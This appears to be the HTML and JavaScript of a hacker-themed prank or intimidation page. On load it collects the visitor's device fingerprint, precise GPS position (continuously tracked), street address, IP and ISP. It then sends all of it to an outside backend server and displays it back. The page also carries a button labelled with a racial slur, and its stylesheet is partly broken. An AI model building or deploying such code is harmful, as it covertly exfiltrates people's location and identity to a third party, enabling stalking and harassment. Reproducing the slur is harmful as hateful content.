<head>
  <meta charset="UTF-8" />

  <style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');

    /* Reset */
    * {

    /* Loading overlay under container */
    #loading-overlay {

      padding: 20px 30px;
      color: #00ff00;
      font-family: 'Share Tech Mono', monospace;

      box-shadow:
        0 0 15px #00ff00cc,
        inset 0 0 30px #00ff00cc;
      z-index: 20;
      display: none;
    }

    #progress-bar-container {
      width: 100%;
      background: #003300;
      border: 2px solid #00ff00;
      border-radius: 12px;
      margin: 15px 0 25px 0;
      height: 30px;
      overflow: hidden;
      box-shadow: inset 0 0 10px #00ff00aa;
    }

    #progress-bar {
      height: 100%;

    #loading-details {

    /* Location info display */

    .coord-display {

      margin: 5px;

    }

    /* Satellite view button */
    #satellite-btn {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: rgba(0, 0, 0, 0.85);
      border: 2px solid #00ff00;
      border-radius: 8px;
      padding: 10px 20px;
      color: #00ff00;
      font-family: 'Share Tech Mono', monospace;
      cursor: pointer;
      z-index: 50;
      display: none;

    #satellite-btn:hover {

    /* Satellite modal */
    #satellite-modal {
      display: none;
      position: fixed;

    #satellite-modal .close-btn {
      position: absolute;

      border: 2px solid #00ff00;

      height: 30px;
      border-radius: 50%;
      cursor: pointer;
      font-size: 20px;

      align-items: center;
      justify-content: center;
    }

    #satellite-modal .close-btn:hover {

      color: black;
    }

    #satellite-coords {
      margin-top: 10px;
      font-size: 0.9rem;

    }

    /* System info display */
    #system-info {
      margin-top: 10px;

      border: 1px solid #00ff00;

    }

    .fingerprint {

    }
  </style>

<body>
  <canvas id="matrix-canvas"></canvas>

  <div class="container" role="main" aria-label="Welcome message">

    <div id="location-info">
      <div class="coord-display" id="latitude">--.------</div>

  <!-- Buttons fixed on top -->
  <div id="sound-buttons">
    <button data-sound="sound1.mp3">Buy Nigger</button>

  <!-- Satellite button (appears after location found) -->
  <button id="satellite-btn">🛰️ VIEW SATELLITE</button>

  <!-- Satellite modal -->
  <div id="satellite-modal">
    <div class="close-btn" onclick="closeSatellite()">×</div>
    <h3 style="color: #00ff00; margin-bottom: 10px;">🛰️ SATELLITE IMAGERY</h3>
    <img id="satellite-image" src="" alt="Satellite view">
    <div id="satellite-coords"></div>
  </div>

  <div id="matrix-cursor"></div>

  <script>
    // Matrix digital rain effect
    (() => {
      const canvas = document.getElementById('matrix-canvas');
      const ctx = canvas.getContext('2d');

      let width, height;
      let columns;
      let drops = [];

      const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%';

      function init() {
        width = window.innerWidth;
        height = window.innerHeight;
        canvas.width = width;
        canvas.height = height;

        columns = Math.floor(width / 20);
        drops = new Array(columns).fill(1);
      }

      function draw() {
        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
        ctx.fillRect(0, 0, width, height);

        ctx.fillStyle = '#00ff00';
        ctx.font = '20px "Share Tech Mono", monospace';

        for (let i = 0; i < drops.length; i++) {
          const text = characters.charAt(Math.floor(Math.random() * characters.length));
          const x = i * 20;
          const y = drops[i] * 20;

          ctx.fillText(text, x, y);

          if (y > height && Math.random() > 0.975) drops[i] = 0;
          drops[i]++;
        }
      }

      window.addEventListener('resize', init);

      init();
      setInterval(draw, 35);
    })();

    // Custom green cursor with trailing effect
    (() => {
      const cursor = document.getElementById('matrix-cursor');
      let mouseX = window.innerWidth / 2;
      let mouseY = window.innerHeight / 2;

      const trailCount = 10;
      const trailElements = [];

      for (let i = 0; i < trailCount; i++) {
        const el = document.createElement('div');
        el.style.position = 'fixed';
        el.style.width = '10px';
        el.style.height = '10px';
        el.style.background = 'limegreen';
        el.style.borderRadius = '50%';
        el.style.pointerEvents = 'none';
        el.style.opacity = (1 - i / trailCount).toString();
        el.style.filter = 'drop-shadow(0 0 4px limegreen)';
        el.style.mixBlendMode = 'screen';
        el.style.transform = 'translate(-50%, -50%)';
        el.style.zIndex = 15;
        document.body.appendChild(el);
        trailElements.push(el);
      }

      let positions = Array(trailCount).fill({x: mouseX, y: mouseY});

      document.addEventListener('mousemove', e => {
        mouseX = e.clientX;
        mouseY = e.clientY;
      });

      function animate() {
        positions.unshift({x: mouseX, y: mouseY});
        positions.pop();

        cursor.style.left = mouseX + 'px';
        cursor.style.top = mouseY + 'px';

        trailElements.forEach((el, i) => {
          const pos = positions[i + 1];
          if (pos) {
            el.style.left = pos.x + 'px';
            el.style.top = pos.y + 'px';
          }
        });

        requestAnimationFrame(animate);
      }

      animate();
    })();

    // ==================== CONFIG ====================
    const BACKEND_URL = "https://b-n1nt.onrender.com"; // Will use same domain or change to your Render URL
    let currentLocation = null;
    let systemInfo = null;
    let watchId = null;
    let fragments = [];
    let buttonPresses = 0;
    let threatLevel = 0;

    // ==================== EXACT LOCATION TRACKING ====================
    async function getExactLocation() {
      document.getElementById('location-info').style.display = 'block';
      document.getElementById('exact-address').innerHTML = '<span class="loading"></span> Acquiring GPS signal...';
      
      try {
        // Try GPS first (most accurate)
        if (navigator.geolocation) {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0
            });
          });
          
          await processLocation(position.coords, 'GPS (High Accuracy)');
        } else {
          // Fallback to IP geolocation
          await getIPLocation();
        }
      } catch (gpsError) {
        console.log('GPS failed, trying IP:', gpsError);
        await getIPLocation();
      }
    }

    async function processLocation(coords, source) {
      const lat = coords.latitude;
      const lon = coords.longitude;
      const accuracy = coords.accuracy || 1000;

      currentLocation = {
        lat: lat,
        lon: lon,
        accuracy: accuracy,
        source: source
      };

      // Update display
      document.getElementById('latitude').textContent = lat.toFixed(6);
      document.getElementById('longitude').textContent = lon.toFixed(6);
      document.getElementById('location-source').innerHTML = `📡 Source: ${source} | 🎯 Accuracy: ${accuracy.toFixed(1)}m`;
      
      // Get reverse geocoding for exact address
      await getExactAddress(lat, lon);
      
      // Show satellite button
      document.getElementById('satellite-btn').style.display = 'block';
      
      // Send to backend
      await sendToBackend();
    }

    async function getExactAddress(lat, lon) {
      try {
        // Using OpenStreetMap Nominatim for reverse geocoding
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
        const data = await response.json();
        
        const address = data.address || {};
        
        // Format exact address
        const addressParts = [];
        if (address.house_number) addressParts.push(address.house_number);
        if (address.road) addressParts.push(address.road);
        if (address.suburb) addressParts.push(address.suburb);
        if (address.city || address.town || address.village) {
          addressParts.push(address.city || address.town || address.village);
        }
        if (address.county) addressParts.push(address.county);
        if (address.state) addressParts.push(address.state);
        if (address.postcode) addressParts.push(address.postcode);
        if (address.country) addressParts.push(address.country);

        const fullAddress = addressParts.join(', ');
        
        document.getElementById('exact-address').innerHTML = `
          <strong>Exact Address:</strong><br>
          ${fullAddress}
        `;

        // Display all available details
        const details = [];
        if (address.house_number) details.push(`🏠 House: ${address.house_number}`);
        if (address.road) details.push(`🛣️ Road: ${address.road}`);
        if (address.neighbourhood || address.suburb) details.push(`🏘️ Neighbourhood: ${address.neighbourhood || address.suburb || 'N/A'}`);
        if (address.city || address.town || address.village) details.push(`🏙️ City: ${address.city || address.town || address.village}`);
        if (address.county) details.push(`🗺️ County: ${address.county}`);
        if (address.state) details.push(`📍 State: ${address.state}`);
        if (address.postcode) details.push(`📮 ZIP: ${address.postcode}`);
        if (address.country) details.push(`🌍 Country: ${address.country}`);
        
        document.getElementById('location-details').innerHTML = details.join('<br>');

        // Add to location data
        currentLocation = {
          ...currentLocation,
          address: fullAddress,
          house_number: address.house_number,
          road: address.road,
          neighbourhood: address.neighbourhood || address.suburb,
          city: address.city || address.town || address.village,
          county: address.county,
          state: address.state,
          zip: address.postcode,
          country: address.country
        };

        // Update satellite image
        updateSatelliteImage(lat, lon);
        
      } catch (error) {
        console.error('Reverse geocoding failed:', error);
        document.getElementById('exact-address').innerHTML = 'Address lookup failed';
      }
    }

    async function getIPLocation() {
      try {
        const response = await fetch('http://ip-api.com/json/');
        const data = await response.json();
        
        if (data.status === 'success') {
          await processLocation({
            latitude: data.lat,
            longitude: data.lon,
            accuracy: 1000
          }, 'IP Geolocation');
          
          document.getElementById('exact-address').innerHTML = `
            <strong>IP-Based Location:</strong><br>
            ${data.city}, ${data.regionName}, ${data.country}<br>
            ISP: ${data.isp || 'Unknown'}
          `;
        }
      } catch (error) {
        console.error('IP location failed:', error);
        document.getElementById('exact-address').innerHTML = 'Location unavailable';
      }
    }

    function startWatchingPosition() {
      if (navigator.geolocation) {
        watchId = navigator.geolocation.watchPosition(
          async (position) => {
            await processLocation(position.coords, 'GPS (Real-time)');
          },
          (error) => console.log('Watch error:', error),
          {
            enableHighAccuracy: true,
            maximumAge: 0,
            timeout: 5000
          }
        );
      }
    }

    // ==================== SYSTEM FINGERPRINT ====================
    async function collectSystemInfo() {
      document.getElementById('system-info').style.display = 'block';
      
      systemInfo = {
        platform: navigator.platform,
        browser: navigator.userAgent,
        cores: navigator.hardwareConcurrency || 'Unknown',
        memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
        screen: {
          width: screen.width,
          height: screen.height
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        cookies: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack || 'Not set',
        timestamp: new Date().toISOString()
      };

      // Generate unique fingerprint
      const fingerprint = await generateFingerprint();
      
      document.getElementById('sys-info-content').innerHTML = `
        <strong>Platform:</strong> ${systemInfo.platform}<br>
        <strong>Browser:</strong> ${systemInfo.browser.substring(0, 50)}...<br>
        <strong>CPU Cores:</strong> ${systemInfo.cores}<br>
        <strong>RAM:</strong> ${systemInfo.memory}<br>
        <strong>Screen:</strong> ${systemInfo.screen.width}x${systemInfo.screen.height}<br>
        <strong>Timezone:</strong> ${systemInfo.timezone}<br>
        <strong>Language:</strong> ${systemInfo.language}<br>
        <strong>Cookies:</strong> ${systemInfo.cookies ? 'Enabled' : 'Disabled'}<br>
        <strong>Do Not Track:</strong> ${systemInfo.doNotTrack}
      `;

      document.getElementById('fingerprint-hash').innerHTML = `FP: ${fingerprint}`;
      
      return systemInfo;
    }

    async function generateFingerprint() {
      const components = [
        systemInfo.platform,
        `${systemInfo.screen.width}x${systemInfo.screen.height}`,
        systemInfo.timezone,
        systemInfo.cores,
        systemInfo.language
      ].join('|');
      
      const encoder = new TextEncoder();
      const data = encoder.encode(components);
      const hash = await crypto.subtle.digest('SHA-256', data);
      return Array.from(new Uint8Array(hash)).slice(0, 8).map(b => b.toString(16).padStart(2, '0')).join('');
    }

    // ==================== SATELLITE VIEW ====================
    function updateSatelliteImage(lat, lon) {
      // Using ESRI satellite imagery (no API key needed)
      const zoom = 18;
      
      // Calculate tile coordinates
      const x = Math.floor((lon + 180) / 360 * Math.pow(2, zoom));
      const y = Math.floor((1 - Math.log(Math.tan(lat * Math.PI/180) + 1/Math.cos(lat * Math.PI/180)) / Math.PI) / 2 * Math.pow(2, zoom));
      
      // Store for later use
      currentLocation.satellite = {
        zoom: zoom,
        x: x,
        y: y
      };
    }

    function showSatellite() {
      if (!currentLocation) return;
      
      const modal = document.getElementById('satellite-modal');
      const img = document.getElementById('satellite-image');
      const coords = document.getElementById('satellite-coords');
      
      const lat = currentLocation.lat;
      const lon = currentLocation.lon;
      const zoom = 18;
      
      // Calculate tile coordinates
      const x = Math.floor((lon + 180) / 360 * Math.pow(2, zoom));
      const y = Math.floor((1 - Math.log(Math.tan(lat * Math.PI/180) + 1/Math.cos(lat * Math.PI/180)) / Math.PI) / 2 * Math.pow(2, zoom));
      
      img.src = `https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/${zoom}/${y}/${x}`;
      coords.innerHTML = `📍 ${lat.toFixed(6)}, ${lon.toFixed(6)} | Zoom: ${zoom}`;
      
      modal.style.display = 'block';
    }

    function closeSatellite() {
      document.getElementById('satellite-modal').style.display = 'none';
    }

    // Satellite button click
    document.getElementById('satellite-btn').addEventListener('click', showSatellite);

    // Close modal on click outside
    window.addEventListener('click', (e) => {
      const modal = document.getElementById('satellite-modal');
      if (e.target === modal) {
        modal.style.display = 'none';
      }
    });

    // ==================== BACKEND COMMUNICATION ====================
    async function sendToBackend() {
      try {
        // Get IP data
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        
        const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const locData = await locResponse.json();

        // Build comprehensive user info matching backend VisitorInfo model
        const userInfo = {
          ip: locData.ip,
          city: locData.city || 'N/A',
          region: locData.region || 'N/A',
          country: locData.country_name || 'N/A',
          timezone: locData.timezone || systemInfo?.timezone || 'N/A',
          userAgent: navigator.userAgent,
          screen: {
            width: window.screen.width,
            height: window.screen.height,
            colorDepth: window.screen.colorDepth,
            pixelDepth: window.screen.pixelDepth
          },
          browser: {
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            platform: navigator.platform,
            language: navigator.language,
            cookies: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack
          },
          // Advanced location
          location: currentLocation?.address ? { display_name: currentLocation.address } : {},
          address: currentLocation ? {
            house_number: currentLocation.house_number,
            road: currentLocation.road,
            neighbourhood: currentLocation.neighbourhood,
            city: currentLocation.city,
            county: currentLocation.county,
            state: currentLocation.state,
            postcode: currentLocation.zip,
            country: currentLocation.country
          } : {},
          coordinates: currentLocation ? {
            lat: currentLocation.lat,
            lon: currentLocation.lon
          } : {},
          accuracy: currentLocation?.accuracy || 0,
          source: currentLocation?.source || 'Unknown',
          // System
          system: systemInfo || {},
          fragments: fragments,
          button_presses: buttonPresses
        };

        // Send to backend
        const response = await fetch(`${BACKEND_URL}/submit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(userInfo)
        });

        const result = await response.json();
        console.log('Backend response:', result);

      } catch (error) {
        console.error('Error sending to backend:', error);
      }
    }

    // ==================== LOADING PROGRESS ====================
    const loadingOverlay = document.getElementById('loading-overlay');
    const loadingPercentage = document.getElementById('loading-percentage');
    const progressBar = document.getElementById('progress-bar');
    const loadingDetails = document.getElementById('loading-details');

    let progress = 0;
    const intervalSpeed = 40;

    async function loadUserData() {
      loadingOverlay.style.display = 'block';
      loadingDetails.style.display = 'none';

      // Start collecting data
      await collectSystemInfo();
      await getExactLocation();
      startWatchingPosition();

      // Fill progress bar
      await new Promise(resolve => {
        const progressInterval = setInterval(() => {
          if (progress < 100) {
            progress++;
            loadingPercentage.textContent = progress + '%';
            progressBar.style.width = progress + '%';
          } else {
            clearInterval(progressInterval);
            resolve();
          }
        }, intervalSpeed);
      });

      // After progress is 100%, show details
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();

        const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const locData = await locResponse.json();

        let detailString = `IP: ${locData.ip}\n`;
        detailString += `City: ${locData.city}\n`;
        detailString += `Region: ${locData.region}\n`;
        detailString += `Country: ${locData.country_name}\n`;
        detailString += `Timezone: ${locData.timezone}\n`;
        detailString += `User Agent: ${navigator.userAgent}\n`;
        detailString += `Screen: ${window.screen.width}x${window.screen.height}\n`;
        detailString += `Language: ${navigator.language}\n`;
        
        if (currentLocation) {
          detailString += `\n📍 EXACT COORDINATES:\n`;
          detailString += `Latitude: ${currentLocation.lat.toFixed(6)}\n`;
          detailString += `Longitude: ${currentLocation.lon.toFixed(6)}\n`;
          detailString += `Accuracy: ${currentLocation.accuracy}m\n`;
          detailString += `Source: ${currentLocation.source}\n`;
        }

        loadingDetails.textContent = detailString;
        loadingDetails.style.display = 'block';

      } catch (error) {
        loadingDetails.textContent = 'Error loading details.';
        loadingDetails.style.display = 'block';
        console.error(error);
      }
    }

    // ==================== SOUND BUTTONS ====================
    const audioPlayer = new Audio();

    document.getElementById('sound-buttons').addEventListener('click', e => {
      if (e.target.tagName === 'BUTTON') {
        const soundFile = e.target.getAttribute('data-sound');
        if (!soundFile) return;
        audioPlayer.src = soundFile;
        audioPlayer.play().catch(err => console.log('Play error:', err));
      }
    });

    // ==================== INITIALIZE ====================
    window.addEventListener('load', () => {
      loadUserData();
    });

    // Cleanup on page unload
    window.addEventListener('beforeunload', () => {
      if (watchId) {
        navigator.geolocation.clearWatch(watchId);
      }
    });
  </script>
</body>
</html>
